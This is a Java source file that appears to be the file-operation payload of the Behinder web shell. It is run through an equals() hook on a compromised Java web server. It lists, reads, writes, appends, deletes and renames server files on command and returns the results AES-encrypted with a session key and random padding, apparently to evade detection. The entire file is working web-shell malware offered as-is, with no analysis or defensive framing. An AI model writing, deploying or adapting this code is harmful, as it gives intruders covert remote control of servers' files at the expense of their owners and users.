package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class FileOperation {
    public static String mode;
    public static String path;
    public static String content;
    public static String charset = "UTF-8";
    public static String newPath;
    public static String status = "success";
    public static Object Request;
    public static Object Response;
    public static Object Session;
    public static Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<String, String>();
        try {
            fillContext(obj);
            String op = mode == null ? "" : mode;
            if ("list".equalsIgnoreCase(op)) {
                result.put("msg", list());
            } else if ("show".equalsIgnoreCase(op)) {
                result.put("msg", show());
            } else if ("delete".equalsIgnoreCase(op)) {
                result.put("msg", delete());
            } else if ("create".equalsIgnoreCase(op)) {
                result.put("msg", create());
            } else if ("append".equalsIgnoreCase(op)) {
                result.put("msg", append());
            } else if ("rename".equalsIgnoreCase(op)) {
                result.put("msg", renameFile());
            } else if ("createDirectory".equalsIgnoreCase(op)) {
                result.put("msg", createDirectory());
            } else {
                result.put("msg", "unsupported mode: " + op);
                result.put("status", "fail");
            }
            if (!result.containsKey("status")) {
                result.put("status", status);
            }
            Method getOutputStream = Response.getClass().getMethod("getOutputStream", new Class[0]);
            Object so = getOutputStream.invoke(Response, new Object[0]);
            Method write = so.getClass().getMethod("write", new Class[] { byte[].class });
            write.invoke(so, new Object[] { Encrypt(buildJson(result, true).getBytes("UTF-8")) });
            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
        } catch (Throwable e) {
            result.put("msg", e.getMessage() == null ? e.toString() : e.getMessage());
            result.put("status", "fail");
            try {
                Method getOutputStream = Response.getClass().getMethod("getOutputStream", new Class[0]);
                Object so = getOutputStream.invoke(Response, new Object[0]);
                Method write = so.getClass().getMethod("write", new Class[] { byte[].class });
                write.invoke(so, new Object[] { Encrypt(buildJson(result, true).getBytes("UTF-8")) });
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Throwable ignored) {
            }
        }
        return true;
    }

    public static String list() throws Exception {
        File dir = new File(path == null || path.length() == 0 ? "." : path);
        File[] files = dir.listFiles();
        List<Map<String, String>> items = new ArrayList<Map<String, String>>();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                File f = files[i];
                Map<String, String> item = new HashMap<String, String>();
                item.put("name", f.getName());
                item.put("size", String.valueOf(f.length()));
                item.put("perm", getFilePerm(f));
                item.put("type", f.isDirectory() ? "directory" : "file");
                item.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new java.util.Date(f.lastModified())));
                items.add(item);
            }
        }
        return buildJsonArray(items, true);
    }

    public static String show() throws Exception {
        return base64encode(getFileData(path));
    }

    public static String create() throws Exception {
        FileOutputStream fos = new FileOutputStream(path);
        fos.write(base64decode(content));
        fos.flush();
        fos.close();
        return "ok";
    }

    public static String append() throws Exception {
        FileOutputStream fos = new FileOutputStream(path, true);
        fos.write(base64decode(content));
        fos.flush();
        fos.close();
        return "ok";
    }

    public static String delete() throws Exception {
        File f = new File(path);
        if (!f.exists()) {
            return "not exists";
        }
        return f.delete() ? "ok" : "delete failed";
    }

    public static String renameFile() throws Exception {
        File oldFile = new File(path);
        File target = new File(newPath);
        return oldFile.renameTo(target) ? "ok" : "rename failed";
    }

    public static String createDirectory() throws Exception {
        File f = new File(path);
        return f.mkdirs() || f.exists() ? "ok" : "mkdir failed";
    }

    public static String getFilePerm(File f) {
        StringBuilder sb = new StringBuilder();
        sb.append(f.canRead() ? "R" : "-");
        sb.append(f.canWrite() ? "W" : "-");
        sb.append(f.canExecute() ? "E" : "-");
        return sb.toString();
    }

    public static byte[] getFileData(String filePath) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(filePath);
        byte[] buffer = new byte[8192];
        int n;
        while ((n = fis.read(buffer)) > 0) {
            bos.write(buffer, 0, n);
        }
        fis.close();
        return bos.toByteArray();
    }

    public static byte[] Encrypt(byte[] bs) throws Exception {
        String key = Session.getClass().getMethod("getAttribute", new Class[] { String.class }).invoke(Session, new Object[] { "u" }).toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bos.write(encrypted);
        bos.write(getMagic());
        return bos.toByteArray();
    }

    public static String base64encode(byte[] data) throws Exception {
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", new Class[0]).invoke(base64, new Object[0]);
            return encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(encoder, new Object[] { data }).toString();
        } catch (Throwable error) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(encoder, new Object[] { data }).toString().replace("\n", "").replace("\r", "");
        }
    }

    public static byte[] base64decode(String data) throws Exception {
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", new Class[0]).invoke(base64, new Object[0]);
            return (byte[]) decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { data });
        } catch (Throwable error) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { data });
        }
    }

    public static String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        Iterator<String> it = entity.keySet().iterator();
        while (it.hasNext()) {
            String key = it.next();
            sb.append("\"").append(key).append("\":\"");
            String value = entity.get(key);
            if (encode) {
                value = base64encode(value.getBytes("UTF-8"));
            }
            sb.append(value).append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    public static String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (int i = 0; i < list.size(); i++) {
            sb.append(buildJson(list.get(i), encode)).append(",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    public static void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map) obj;
            Session = objMap.get("session");
            Response = objMap.get("response");
            Request = objMap.get("request");
        }
        Response.getClass().getMethod("setCharacterEncoding", new Class[] { String.class }).invoke(Response, new Object[] { "UTF-8" });
    }

    public static byte[] getMagic() throws Exception {
        String key = Session.getClass().getMethod("getAttribute", new Class[] { String.class }).invoke(Session, new Object[] { "u" }).toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        byte[] buf = new byte[magicNum];
        new Random().nextBytes(buf);
        return buf;
    }
}
